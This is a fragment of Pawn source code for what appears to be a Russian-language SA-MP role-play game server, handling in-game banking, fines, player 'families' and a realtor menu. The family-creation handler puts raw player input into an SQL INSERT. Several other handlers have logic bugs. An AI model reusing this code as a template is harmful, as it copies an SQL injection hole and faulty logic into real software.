						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "С Вашего основного банковского счета было снято {FFFFFF}%d {0099FF}рублей", sum);
						SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

						PI[playerid][pBank] -= sum;
						GiveMoney(playerid, sum);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "~r~-%d руб", sum);
						GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET bank=%d WHERE id=%d", PI[playerid][pBank], PI[playerid][pID]);
						mysql_query(dbHandle, STRING_GLOBAL);
					}
					else SendMess(playerid, MSG_NO_MONEY_BANK);
				}
				else
				{
					if(GetMoney(playerid) >= sum)
					{
						if(PI[playerid][pBank] + sum > 1000000000)
							return SendClientMessage(playerid, C_RED, "На банковском счету запрещено иметь более 1000000000 рублей");

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "На Ваш основной банковский счет было пополнено {FFFFFF}%d {0099FF}рублей", sum);
						SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

						PI[playerid][pBank] += sum;
						GiveMoney(playerid, -sum);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "~y~+%d руб", sum);
						GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET bank=%d WHERE id=%d", PI[playerid][pBank], PI[playerid][pID]);
						mysql_query(dbHandle, STRING_GLOBAL);
					}
					else SendMess(playerid, MSG_NOT_MONEY);
				}
			}
		}
		else ShowPlayerBankPanel(playerid);
	}

	case DIALOG_BANK_SELECT_SUM_COMPANY:
	{
		if(response)
		{
			if(GetPlayerBizz(playerid) > 0)
			{
				new sum = strval(inputtext);
				if(sum > 0 && IsNumeric(inputtext))
				{
					new businessid = GetPVarInt(playerid, "PlayerBizz");

					if(player_select_other_sum[playerid])
					{
						if(BizzInfo[businessid][bMoney] >= sum)
						{
							if(GetMoney(playerid) + sum > 1000000000)
								return SendClientMessage(playerid, C_RED, "На руках запрещено иметь более 1000000000 рублей");

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Со счета Вашего предприятия было снято {FFFFFF}%d {0099FF}рублей", sum);
							SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

							BizzInfo[businessid][bMoney] -= sum;
							GiveMoney(playerid, sum);

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "~y~+%d руб", sum);
							GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE bizz SET money=%d WHERE id=%d", BizzInfo[businessid][bMoney], businessid);
							mysql_query(dbHandle, STRING_GLOBAL);
						}
						else SendClientMessage(playerid, C_RED, "На счету вашего предприятия недостаточно денег");
					}
					else
					{
						if(GetMoney(playerid) >= sum)
						{
							if(BizzInfo[businessid][bMoney] + sum > 1000000000)
								return SendClientMessage(playerid, C_RED, "На счету предприятия запрещено иметь более 1000000000 рублей");

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы пополнили счет своего предприятия на {FFFFFF}%d {0099FF}рублей", sum);
							SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

							BizzInfo[businessid][bMoney] += sum;
							GiveMoney(playerid, -sum);

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "~r~-%d руб", sum);
							GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE bizz SET money=%d WHERE id=%d", BizzInfo[businessid][bMoney], businessid);
							mysql_query(dbHandle, STRING_GLOBAL);
						}
						else SendMess(playerid, MSG_NOT_MONEY);
					}
				}
			}
			else SendClientMessage(playerid, C_RED, "У Вас нет предприятия");
		}
		else ShowPlayerBankPanel(playerid);
	}

	case DIALOG_BANK_PHONE_BALANCE:
	{
		if(response)
		{
			new sum = strval(inputtext);
			if(sum > 0 && IsNumeric(inputtext))
			{
				if(GetMoney(playerid) >= sum)
				{
					PI[playerid][pPhoneBalance] += sum;
					GiveMoney(playerid, -sum);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "~r~-%d руб", sum);
					GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы пополнили счет мобильного телефона на {FFFFFF}%d {FFFFFF}рублей", sum);
					SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Сейчас на счету {FFFFFF}%d {FFFFFF}рублей", PI[playerid][pPhoneBalance]);
					SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET phonebalance=%d WHERE id=%d", PI[playerid][pPhoneBalance], PI[playerid][pID]);
					mysql_query(dbHandle, STRING_GLOBAL);
				}
				else SendMess(playerid, MSG_NOT_MONEY);
			}
		}
	}

	case DIALOG_BANK_TRANSFER:
	{
		if(response)
		{
			new price, to_player;

			if(sscanf(inputtext, "p<,>ud", to_player, price))
				return ShowPlayerDialoBankTransfer(playerid);

			if(to_player == INVALID_PLAYER_ID)
				return SendMess(playerid, MSG_PLAYER_OFFLINE);

			// if TransferReset[playerid] == -1
			if(price > 0)
			{
				if(PI[playerid][pBank] > price)
				{
					if(PI[to_player][pBank] + price > 999999999)
						return SendClientMessage(playerid, C_RED, "У этого игрока не может быть столько денег");

					GiveBankMoney(playerid, -price, "Transfer-");
					GiveBankMoney(to_player, price, "Transfer+");

					SendMes(playerid, COLOR_WHITE, "Вы перевели %d рублей игроку %s[%d] на счет", price, GetName(to_player), playerid);
					SendMes(to_player, COLOR_WHITE, "Вам поступил перевод на Ваш счет в размере %d рублей от игрока %s[%d]", price, GetName(playerid), playerid);

					// TransferReset[playerid] = 60;
				}
				else ShowPlayerDialoBankTransfer(playerid), SendClientMessage(playerid, C_RED, "На вашем основном банковском счету недостаточно денег");
			}
		//	else SendClientMessage(playerid, C_RED, "Переводить деньги можно раз в минуту");
		}
	}

	case DIALOG_PAY_FINES:
	{
		if(response)
		{
			new fines_id = strval(inputtext);

			if(fines_id > 0 && IsNumeric(inputtext))
			{
				new Cache: result, rows;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM fines WHERE id=%d", fines_id);
				result = mysql_query(dbHandle, STRING_GLOBAL);

				rows = cache_num_rows();

				if(!rows)
					return SendClientMessage(playerid, C_RED, "Такого штрафа нет"), cache_delete(result);

				STRING_GLOBAL[0] = EOS;

				new year, month, day;
				new hour, minute, second;

				new amount = cache_get_field_content_int(0, "amount"),
					reason[64],
					time = cache_get_field_content_int(0, "time");

				timestamp_to_date(time, year, month, day, hour, minute, second);

				cache_get_field_content(0, "reason", reason);

				format
				(
					STRING_GLOBAL, sizeof STRING_GLOBAL,
					"{FFFFFF}Номер штрафа:\t{FFCC00}%d\n"\
					"{FFFFFF}Сумма:\t\t\t{FFCC00}%d рублей\n"\
					"{FFFFFF}Причина:\t\t{FFCC00}%s\n"\
					"{FFFFFF}Дата:\t\t\t{FFCC00}%d-%02d-%02d %02d:%02d:%02d\n\n"\
					"{FFFFFF}Вы действительно хотите оплатить этот штраф?",
					fines_id,
					amount,
					reason,
					year, month, day, hour, minute, second
				);

				g_player_listitem[playerid][0] = fines_id;
				g_player_listitem[playerid][1] = amount;

				ShowPlayerDialog
				(
					playerid, DIALOG_PAY_FINES_ANS, DIALOG_STYLE_MSGBOX,
					"{FFCC00}Оплата штрафа",
					STRING_GLOBAL,
					"Оплатить", "Отмена"
				);
			}
		}
	}

	case DIALOG_PAY_FINES_ANS:
	{
		if(response)
		{
			new fines_id = g_player_listitem[playerid][0];
			new amount = g_player_listitem[playerid][1];

			if(fines_id > 0 && amount > 0)
			{
				if(GetMoney(playerid) < amount)
					return SendMess(playerid, MSG_NOT_MONEY);

				GiveMoney(playerid, -amount);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "DELETE FROM fines WHERE id=%d", fines_id);
				mysql_query(dbHandle, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно оплатили штраф №%d за %d рублей.", fines_id, amount);
				SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
			}
		}
	}

	case DIALOG_FAMILY:
	{
		if(response)
		{
			new familyid = PI[playerid][P_FAMILY];

			if(familyid != 0)
			{
				switch(listitem)
				{
					case 0:
					{
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM family WHERE id=%d", familyid);
						mysql_tquery(dbHandle, STRING_GLOBAL, "ShowFamilyInfo", "ii", playerid, familyid);
					}
					case 1:
					{
						ShowFamilyStructureDialog(playerid, familyid);
					}
					case 2:
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_FAMILY_SHOW_ALL, DIALOG_STYLE_LIST,
							"{FFCC00}Сортирование",
							!"{FFFFFF}1. По возрастанию ранга\n"\
							"2. По убыванию ранга\n"\
							"3. По возрастанию даты входа\n"\
							"4. По убыванию даты входа\n"\
							"5. По возрастанию уровня\n"\
							"6. По убыванию уровня\n"\
							"7. По алфавиту",
							"Далее", "Отмена"
						);
					}
					case 3:
					{
						ShowPlayerMenuColors(playerid);
					}
					case 4:
					{
						if(GetFamilyRang(playerid) == 3)
							return SendClientMessage(playerid, C_RED, "Создатель не может покинуть семью");

						if(GetFamilyRang(playerid) == 2)
						{
							for(new idx; idx < 3; idx ++)
							{
								if(!strcmp(g_family_info[familyid-1][F_SUB][idx], PI[playerid][pID], false))
								{
									g_family_info[familyid-1][F_SUB][idx] = 0;
									break;
								}
							}
						}

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[%s] %s[%d] покинул семью по собственному желанию",  GetFamilyData(familyid-1, F_NAME), GetName(playerid), playerid);
						SendFamilyMessage(familyid, STRING_GLOBAL);

						Iter_Remove(FamilyMembers[familyid], playerid);

						PI[playerid][P_FAMILY] = 0;

						DestroyDynamic3DTextLabel(FamilyName[playerid]);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts a, family f SET a.family=0, a.familyzam=0, f.sub='%d, %d, %d' WHERE a.id=%d AND f.id=%d", g_family_info[familyid-1][F_SUB][0], g_family_info[familyid-1][F_SUB][1], g_family_info[familyid-1][F_SUB][2], PI[playerid][pID], familyid);
						mysql_query(dbHandle, STRING_GLOBAL);
					}
					case 5:
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_FAMILY_SET_SPAWN, DIALOG_STYLE_LIST,
							"{ffcc00}Смена спавна семьи",
							"1. Отсутствует\n"\
							"2. В семейном доме",
							"Установить", "Отмена"
						);
					}
					case 6:
					{
						ShowPlayerDialog
						(
							playerid, DIALOG_FAMILY_ORDER_PROD, DIALOG_STYLE_INPUT,
							"{FFCC00}Заказать продукты",
							"{FFFFFF}Введите количество продуктов, которое хотите заказать:\n"\
							"(цена за 1 продукт - 200 руб)",
							"Заказать", "Отмена"
						);
					}
				}
			}
		}
	}

	case DIALOG_FAMILY_CREATE:
	{
		if(response)
		{
			new len = strlen(inputtext);

			if(!(6 <= len <= 15))
			{
				SendClientMessage(playerid, C_RED, "Длина названия должна быть от 6 до 15 символов");

				return ShowPlayerDialog
						(
							playerid, DIALOG_FAMILY_CREATE, DIALOG_STYLE_INPUT,
							"{FFCC00}Создание семьи",
							"{FFFFFF}Введите название семьи\n"\
							"\t{66CC66}Примечания:\n"\
							"\t- Название может состоять из русских и латинских символов\n"\
							"\t- Название чувствительно к регистру\n"\
							"\t- Длина названияот 6-ти до 15-ти символов",
							"Далее", ""
						);
			}
			if(strfind(inputtext, "%") != -1 || strfind(inputtext, " ") != -1)
			{
				SendClientMessage(playerid, C_RED, "Введенное Вами название содержит недопустимые символы или пробелы");

				return ShowPlayerDialog
						(
							playerid, DIALOG_FAMILY_CREATE, DIALOG_STYLE_INPUT,
							"{FFCC00}Создание семьи",
							"{FFFFFF}Введите название семьи\n"\
							"\t{66CC66}Примечания:\n"\
							"\t- Название может состоять из русских и латинских символов\n"\
							"\t- Название чувствительно к регистру\n"\
							"\t- Длина названияот 6-ти до 15-ти символов",
							"Далее", ""
						);
			}

			new rows;
			new Cache: result;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM family WHERE name='s'", inputtext);
			result = mysql_query(dbHandle, STRING_GLOBAL);

			rows = cache_num_rows();

			if(rows)
			{
				SendClientMessage(playerid, C_RED, "Это название уже используется");
				cache_delete(result);
			}

			new houseid = -1;
			new spawn = 0;

			for(new i = TOTALHOUSE; i > 0; i --)
			{
				if(!strcmp(HouseInfo[i][hOwner], GetName(playerid), true) && HouseInfo[i][hDiscript] == 4)
				{
					houseid = i;
					spawn = 1;
					break;
				}
			}

			PI[playerid][pCredit] -= 200;
			PI[playerid][pTotalCredits] -= 200;
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
			MysqlUpdatePlayerInt(playerid, "totalcredits", PI[playerid][pCredits]);

			new familyid = TOTALFAMILY++;

			ClearFamilyData(familyid);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO family (id, name, owned, owner, time, house, spawn) VALUES ('%d', '%s', '%d', '%s', '%d', '%d', '%d')", familyid+1, inputtext, PI[playerid][pID], GetName(playerid), gettime(), houseid, spawn);
			result = mysql_query(dbHandle, STRING_GLOBAL);

			PI[playerid][P_FAMILY] = familyid+1;

			SetFamilyData(familyid, F_ID, familyid);
			SetFamilyData(familyid, F_OWNED, PI[playerid][pID]);
			format(g_family_info[familyid][F_OWNER], MAX_PLAYER_NAME, "%s", GetName(playerid));
			SetFamilyData(familyid, F_HOUSE, houseid);
			SetFamilyData(familyid, F_SPAWN, spawn == 0 ? false : true);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно создали семью \"%s\". Подробнее о командах: /cmd", inputtext);
			SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

			format(g_family_info[familyid][F_NAME], 64, "%s", inputtext);

			Iter_Add(FamilyMembers[familyid], playerid);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET family=%d WHERE id=%d", familyid+1, PI[playerid][pID]);
			mysql_query(dbHandle, STRING_GLOBAL);

			FamilyName[playerid] = CreateDynamic3DTextLabel(g_family_info[familyid][F_NAME], 0xFFFFFFFF, 0.0, 0.0, 0.5, 10.0, playerid);

			if(houseid != -1)
			{
				SetFamilyData(familyid, F_STORE_LABEL, CreateDynamic3DTextLabel("Склад", 0xFFFF00FF, 498.0487,-2.2444,1904.9518+1.0, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, HouseInfo[houseid][hVirtual], HouseInfo[houseid][hInt]));
				UpdateHouseFamilyLabel(familyid);
			}

			printf("%s P_FAMILY %d F_ID: %d", GetName(playerid), PI[playerid][P_FAMILY], GetFamilyData(familyid-1, F_ID));

			cache_delete(result);
		}
	}

	case DIALOG_FAMILY_SHOW_ALL:
	{
		if(response)
		{
			new familyid = PI[playerid][P_FAMILY];

			if(familyid != 0)
			{
				STRING_GLOBAL[0] = EOS;
				switch(listitem)
				{
					case 0: format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM accounts WHERE family=%d ORDER BY familyzam ", familyid);
					case 1: format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM accounts WHERE family=%d ORDER BY familyzam DESC", familyid);
					case 2: format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM accounts WHERE family=%d ORDER BY datavhod ", familyid);
					case 3: format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM accounts WHERE family=%d ORDER BY datavhod DESC", familyid);
					case 4: format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM accounts WHERE family=%d ORDER BY level ", familyid);
					case 5: format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM accounts WHERE family=%d ORDER BY level DESC", familyid);
					case 6: format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM accounts WHERE family=%d ORDER BY name", familyid);
				}
				mysql_tquery(dbHandle, STRING_GLOBAL, "ShowFamilyMembers", "i", playerid);
			}
		}
	}

	case DIALOG_FAMILY_SET_SPAWN:
	{
		if(response)
		{
			new familyid = PI[playerid][P_FAMILY];

			if(familyid == 0) return 1;

			if(GetFamilyRang(playerid) < 3)
				return SendClientMessage(playerid, C_RED, "Изменить место спавна семьи может только создатель");

			switch(listitem)
			{
				case 0:
				{
					foreach(new i: FamilyMembers[familyid])
					{
						PI[i][pSpawnChange] = 0;
					}

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[%s] Создатель %s [%d] запретил появляться в семейном доме", GetFamilyData(familyid-1, F_NAME), GetName(playerid), playerid);
					SendFamilyMessage(familyid, STRING_GLOBAL);

					g_family_info[familyid-1][F_SPAWN] = false;

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts a, family f SET a.spawnchange=0, f.spawn=0 WHERE a.family=%d AND f.id=%d", familyid, familyid);
					mysql_query(dbHandle, STRING_GLOBAL);
				}
				case 1:
				{
					new houseid = -1;

					for(new i = TOTALHOUSE; i > 0; i --)
					{
						if(!strcmp(HouseInfo[i][hOwner], PI[playerid][pName], true))
						{
							printf("%d", houseid);
							houseid = i;
							break;
						}
					}

					if(HouseInfo[houseid][hDiscript] != 4)
						return SendClientMessage(playerid, C_RED, "В Вашем доме нельзя установить спавн семьи");

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[%s] Создатель %s [%d] разрешил появляться в семейном доме", GetFamilyData(familyid-1, F_NAME), GetName(playerid), playerid);
					SendFamilyMessage(familyid, STRING_GLOBAL);

					g_family_info[familyid-1][F_SPAWN] = true;
					SetFamilyData(familyid, F_HOUSE, houseid);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE family SET spawn=1, house=%d WHERE id=%d", houseid, familyid);
					mysql_query(dbHandle, STRING_GLOBAL);
				}
			}
		}
	}

	case DIALOG_FAMILY_ORDER_PROD:
	{
		if(response)
		{
			new familyid = PI[playerid][P_FAMILY];

			if(familyid != 0)
			{
				new count = strval(inputtext);

				if(count < 0)
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_FAMILY_ORDER_PROD, DIALOG_STYLE_INPUT,
						"{FFCC00}Заказать продукты",
						"{FFFFFF}Введите количество продуктов, которое хотите заказать:\n"\
						"(цена за 1 продукт - 200 руб)",
						"Заказать", "Отмена"
					);
					return 1;
				}
				if(GetMoney(playerid) < count * 100)
					return SendMess(playerid, MSG_NOT_MONEY);

				GiveMoney(playerid, -count * 100);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно заказали %d продуктов за %d рублей", GetFamilyData(familyid-1, F_NAME), GetName(playerid), playerid);
				SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);

				new family_rang[][] = {"Член семьи", "Заместитель", "Создатель"};

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[%s] %s %s [%d] заказал %d продуктов", GetFamilyData(familyid-1, F_NAME), family_rang[GetFamilyRang(playerid)-1], GetName(playerid), playerid, count);
				SendFamilyMessage(familyid, STRING_GLOBAL);

				g_family_info[familyid-1][F_PROD] += count;

				SaveFamilyStore(familyid);
				UpdateHouseFamilyLabel(familyid);
			}
		}
	}

	case DIALOG_FAMILY_STORE:
	{
		if(response)
		{
			new familyid = PI[playerid][P_FAMILY];

			if(familyid != 0)
			{
				new names[][] = {"наркотики", "патроны", "деньги"};

				new	status,
					fmt_info[100];

				if(0 <= listitem <= 2)
					status = 1;

				pPressed[playerid] = status;
				g_player_listitem_use[playerid] = (status == 1 ? listitem : listitem - 3);

				format(fmt_info, sizeof fmt_info, "{FFCC00}%s %s", status == 1 ? "Положить" : "Взять", status == 1 ? names[listitem] : names[listitem - 3]);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{FFFFFF}Введите количество, которое Вы хотите %s:", status == 1 ? "положить" : "взять");

				ShowPlayerDialog
				(
					playerid, DIALOG_FAMILY_STORE_USE, DIALOG_STYLE_INPUT,
					fmt_info,
					STRING_GLOBAL,
					"Далее", "Отмена"
				);
			}
		}
	}

	case DIALOG_FAMILY_STORE_USE:
	{
		if(response)
		{
			new status = pPressed[playerid],
				item = g_player_listitem_use[playerid],
				item_count = strval(inputtext),
				familyid = PI[playerid][P_FAMILY];

			if(familyid != 0)
			{
				if(item_count > 0)
				{
					new names[][] = {"наркотиков", "патронов", "денег"},
						names_type[][] = {"г", "шт", "руб"},
						newslot,
						return_true;

					switch(status)
					{
						case 0:
						{
							switch(item)
							{
								case 0:
								{
									if(GetFamilyData(familyid-1, F_DRUGS) < item_count)
										return SendClientMessage(playerid, C_RED, "На складе недостаточно наркотиков");

									if(CheckMaxVes(playerid, 36, item_count, newslot) == 1)
										return SendClientMessage(playerid, C_RED, "У Вас нет свободного места в инвентаре");

									GiveItem(playerid, 36, item_count);

									g_family_info[familyid-1][F_DRUGS] -= item_count;
								}
								case 1:
								{
									if(GetFamilyData(familyid-1, F_PATRON) < item_count)
										return SendClientMessage(playerid, C_RED, "На складе недостаточно патронов");

									if(CheckMaxVes(playerid, 27, 60, newslot) == 1)
										return SendClientMessage(playerid, C_RED, "У Вас нет свободного места в инвентаре");

        							GiveItem(playerid, 27, 60);

									g_family_info[familyid-1][F_PATRON] -= item_count;
								}
								case 2:
								{
									if(GetFamilyRang(playerid) < 2)
										return SendClientMessage(playerid, C_RED, "Брать деньги могут только заместители и создатель");

									if(GetFamilyData(familyid-1, F_MONEY) < item_count)
										return SendClientMessage(playerid, C_RED, "На складе недостаточно денег");

									if(GetMoney(playerid) + item_count > 1000000000)
										return SendClientMessage(playerid, C_RED, "На руках запрещено иметь более 1000000000 руб");

									GiveMoney(playerid, item_count);

									g_family_info[familyid-1][F_MONEY] -= item_count;
								}
							}

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[%s] %s[%d] взял(а) со склада семьи %d %s %s", GetFamilyData(familyid-1, F_NAME), GetName(playerid), playerid, item_count, names_type[item], names[item]);
							SendFamilyMessage(familyid, STRING_GLOBAL);

							SaveFamilyStore(familyid);
							UpdateHouseFamilyLabel(familyid);
						}
						case 1:
						{
							switch(item)
							{
								case 0:
								{
									for(new s = 16; s > 0; s --)
									{
										if(PlayerItem1[playerid][s] == 35)
										{
											if(PlayerItem2[playerid][s] < item_count)
												return SendClientMessage(playerid, C_RED, "У Вас нет столько наркотиков");

											if(PlayerItem2[playerid][s] == 0) PlayerItem1[playerid][s] = 0;

											PlayerItem2[playerid][s] -= item_count;

											g_family_info[familyid-1][F_DRUGS] += item_count;

											UpDateInv(playerid);
											SaveItem(playerid, s);

											return_true = 1;

											break;
										}
									}
								}
								case 1:
								{
									for(new s = 16; s > 0; s --)
									{
										if(PlayerItem1[playerid][s] == 27)
										{
											if(PlayerItem2[playerid][s] < item_count)
												return SendClientMessage(playerid, C_RED, "У Вас нет столько патронов");

											if(PlayerItem2[playerid][s] == 0) PlayerItem1[playerid][s] = 0;

											PlayerItem2[playerid][s] -= item_count;

											g_family_info[familyid-1][F_PATRON] += item_count;

											UpDateInv(playerid);
											SaveItem(playerid, s);

											return_true = 1;

											break;
										}
									}
								}
								case 2:
								{
									if(GetMoney(playerid) < item_count)
										return SendMess(playerid, MSG_NOT_MONEY);

									GiveMoney(playerid, -item_count);

									g_family_info[familyid-1][F_MONEY] += item_count;

								}
							}

							if(status == 1 && 0 <= item <= 1 && return_true == 0)
							{
								STRING_GLOBAL[0] = EOS;
								format(STRING_GLOBAL, sizeof STRING_GLOBAL, "У Вас нет столько %s", names[item]);
								SendClientMessage(playerid, C_RED, STRING_GLOBAL);
							}

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[%s] %s[%d] положил(а) на склад семьи %d %s %s", GetFamilyData(familyid-1, F_NAME), GetName(playerid), playerid, item_count, names_type[item], names[item]);
							SendFamilyMessage(familyid, STRING_GLOBAL);

							SaveFamilyStore(familyid);
							UpdateHouseFamilyLabel(familyid);
						}
					}
				}
				else SendClientMessage(playerid, C_RED, "Вы ввели неверное количество");
			}
		}
	}

	case DIALOG_FAMILY_BAR:
	{
		if(response)
		{
			if(0 <= listitem <= 10)
			{
				new familyid;
				new houseid = GetPVarInt(playerid, "PlayerHouse");

				for(new idx = 1; idx < sizeof g_family_info; idx ++)
				{
					if(GetFamilyData(idx-1, F_HOUSE) == houseid)
					{
						familyid = idx-1;
						break;
					}
				}

				if(familyid != 0)
				{
					new const price[11] = {300, 300, 500, 1000, 1500, 1500, 1500, 2000, 2500, 3000, 5000};
					new const prod[11] = {2, 2, 4, 9, 14, 14, 14, 19, 24, 29, 49};

					if(GetFamilyData(familyid-1, F_PROD) < prod[listitem])
						return SendClientMessage(playerid, C_RED, "На складе недостаточно продуктов");

					if(GetMoney(playerid) < price[listitem])
						return SendMess(playerid, MSG_NOT_MONEY);

					GiveMoney(playerid, -price[listitem]);

					g_family_info[familyid-1][F_MONEY] += price[listitem];
					g_family_info[familyid-1][F_PROD] -= prod[listitem];

					UpdateHouseFamilyLabel(familyid);
					SaveFamilyStore(familyid);

					switch(listitem)
					{
						case 0..3: SetPlayerSpecialAction(playerid, 23);
						case 4..9: SetPlayerSpecialAction(playerid, 22);
						case 10..11: SetPlayerSpecialAction(playerid, 20);
					}
				}
			}
		}
	}

	case DIALOG_PLAYER_SETTINGS:
	{
		if(response)
		{

		}
	}

	case DIALOG_REALTOR_MENU:
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					new values_houses[8] = {1, 100, 200, 300, 400, 500, 600, 700};

					if(pPressed[playerid] >= 7) pPressed[playerid] = 0;

					ShowPlayerHousesDialog(playerid, values_houses[pPressed[playerid]]);
					pPressed[playerid] ++;
				}
				case 1:
				{
					new values_business[8] = {1, 100, 200, 300, 400, 500, 600, 700};

					if(pPressed[playerid] >= 7 || TOTALHOUSE > values_business[pPressed[playerid]]) pPressed[playerid] = 0;

					ShowPlayerBusinessDialog(playerid, values_business[pPressed[playerid]]);
					pPressed[playerid] ++;
				}
			}
		}
	}

	case DIALOG_REALTOR_MENU_HOUSE:
	{
		if(response)
		{
			if(pPressed[playerid] >= 7) pPressed[playerid] = 0;

			new values_houses[8] = {1, 100, 200, 300, 400, 500, 600, 700};

			ShowPlayerHousesDialog(playerid, values_houses[pPressed[playerid]]);
			pPressed[playerid] ++;
		}
	}

	case DIALOG_REALTOR_MENU_BIZ:
	{
		if(response)
		{
			if(pPressed[playerid] >= 7) pPressed[playerid] = 0;

			new values_business[8] = {1, 100, 200, 300, 400, 500, 600, 700};

			ShowPlayerBusinessDialog(playerid, values_business[pPressed[playerid]]);
			pPressed[playerid] ++;
		}
	}

	case DIALOG_REALTOR_INFO:
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_REALTOR_INFO_HOUSE, DIALOG_STYLE_INPUT,
						"{FFCC00}Информация о доме",
						"{FFFFFF}Введите номер дома, информацию\n"\
						"о котором Вы хотите получить\n\n"\
						"{FFCD00}Стоимость услуги 100 рублей",
						"Далее", "Отмена"
					);
				}
				case 1:
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_REALTOR_INFO_BIZ, DIALOG_STYLE_INPUT,
						"{FFCC00}Информация о бизнесе",
						"{FFFFFF}Введите номер бизнеса, информацию\n"\
						"о котором Вы хотите получить\n\n"\
						"{FFCD00}Стоимость услуги 100 рублей",
						"Далее", "Отмена"
					);
				}
				case 2:
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_REALTOR_INFO_GARAGE, DIALOG_STYLE_INPUT,
						"{FFCC00}Информация о гараже",
						"{FFFFFF}Введите номер гаража, информацию\n"\
						"о котором Вы хотите получить\n\n"\
						"{FFCD00}Стоимость услуги 100 рублей",
						"Далее", "Отмена"
					);
				}
			}
		}
	}

	case DIALOG_REALTOR_INFO_HOUSE:
	{
		if(response)
		{
			new houseid = strval(inputtext);

			if(strlen(inputtext) && IsNumeric(inputtext) && (0 <= houseid <= TOTALHOUSE-1))
			{
				if(GetMoney(playerid) < 100)
					return SendMess(playerid, MSG_NOT_MONEY);

				GiveMoney(playerid, -100);

				ShowPlayerInfoHouseDialog(playerid, houseid);

				g_player_listitem_use[playerid] = houseid;
			}
		}
	}

